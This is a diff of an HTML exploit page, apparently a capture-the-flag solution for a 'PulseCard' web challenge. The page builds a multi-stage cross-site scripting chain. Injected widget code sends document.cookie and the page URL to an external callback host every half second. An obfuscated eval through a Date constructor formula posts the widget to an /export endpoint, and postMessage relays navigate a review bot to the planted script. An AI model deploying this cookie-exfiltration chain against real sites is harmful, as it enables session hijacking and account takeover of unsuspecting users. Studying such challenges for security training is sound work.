@@ -2,10 +2,10 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>PulseCard top-level exploit</title>
+  <title>PulseCard final</title>
 </head>
 <body>
-  <h1>PulseCard exploit</h1>
+  <h1>PulseCard final</h1>
 
   <iframe
     id="sender"
@@ -14,61 +14,27 @@
   </iframe>
 
   <script>
-  const CALLBACK = "https://ypvpgjy.request.dreamhack.games";
+  const CALLBACK = "https://zhgqyap.request.dreamhack.games";
 
   new Image().src = CALLBACK + "/loaded?t=" + Date.now();
 
-  const widgetJS = `
-    (() => {
-      const C = ${JSON.stringify(CALLBACK)};
+  const widgetJS =
+    `(()=>{` +
+    `let C=${JSON.stringify(CALLBACK)};` +
+    `let S=()=>{` +
+    `let c=document.cookie||"EMPTY";` +
+    `new Image().src=C+"/cookie?c="+encodeURIComponent(c)+"&u="+encodeURIComponent(location.href)+"&t="+Date.now();` +
+    `fetch(C+"/fetch?c="+encodeURIComponent(c)+"&t="+Date.now(),{mode:"no-cors",keepalive:true}).catch(()=>{});` +
+    `};` +
+    `S();setInterval(S,500);` +
+    `})()`;
 
-      function send(path, data) {
-        const u = C + path + "?d=" + encodeURIComponent(data) + "&t=" + Date.now();
-
-        try {
-          window.__imgs = window.__imgs || [];
-          const i = new Image();
-          i.src = u;
-          window.__imgs.push(i);
-        } catch (e) {}
-
-        try {
-          fetch(u + "&m=fetch", { mode: "no-cors", keepalive: true }).catch(() => {});
-        } catch (e) {}
-
-        try {
-          navigator.sendBeacon(u + "&m=beacon");
-        } catch (e) {}
-      }
-
-      send("/widget-loaded", location.href);
-      send("/cookie", document.cookie || "EMPTY");
-
-      let n = 0;
-      setInterval(() => {
-        n++;
-        send("/cookie-repeat-" + n, document.cookie || "EMPTY");
-      }, 500);
-    })();
-  `;
-
-  const stage2 = `
-    (async () => {
-      const r = await fetch("/export", {
-        method: "POST",
-        credentials: "include",
-        headers: {
-          "X-Card-Token": CARD_TOKEN,
-          "Content-Type": "application/javascript"
-        },
-        body: ${JSON.stringify(widgetJS)}
-      });
-
-      const name = await r.text();
-
-      location.href = "/review?widget=" + encodeURIComponent(name);
-    })();
-  `;
+  const stage2 =
+    `(async()=>{try{` +
+    `let r=await fetch('/export',{method:'POST',credentials:'include',headers:{'X-Card-Token':CARD_TOKEN,'Content-Type':'application/javascript'},body:${JSON.stringify(widgetJS)}});` +
+    `let x=await r.text();` +
+    `opener.postMessage({t:'stage',s:r.status,x:x},'*');` +
+    `}catch(e){opener.postMessage({t:'err',x:String(e)},'*')}})()`;
 
   const pctAll = s =>
     Array.from(new TextEncoder().encode(s), b =>
@@ -77,6 +43,33 @@
 
   const formula =
     `Date["con"+"structor"](decodeURIComponent(${JSON.stringify(pctAll(stage2))}))()`;
+
+  window.addEventListener("message", e => {
+    const d = e.data || {};
+
+    new Image().src =
+      CALLBACK +
+      "/msg?d=" +
+      encodeURIComponent(JSON.stringify(d).slice(0, 1500)) +
+      "&t=" +
+      Date.now();
+
+    if (d.t === "stage" && d.s === 200 && /^[A-Za-z0-9_-]+\.js$/.test(d.x)) {
+      const target =
+        "http://localhost:5000/review?widget=" + encodeURIComponent(d.x);
+
+      new Image().src =
+        CALLBACK +
+        "/nav?to=" +
+        encodeURIComponent(target) +
+        "&t=" +
+        Date.now();
+
+      setTimeout(() => {
+        location.href = target;
+      }, 300);
+    }
+  });
 
   const inner = `
 <!doctype html>
@@ -87,6 +80,10 @@
   const payload = ${JSON.stringify(formula)};
 
   new Image().src = CALLBACK + "/sender-start?t=" + Date.now();
+
+  window.addEventListener("message", e => {
+    top.postMessage(e.data, "*");
+  });
 
   let w = null;
 
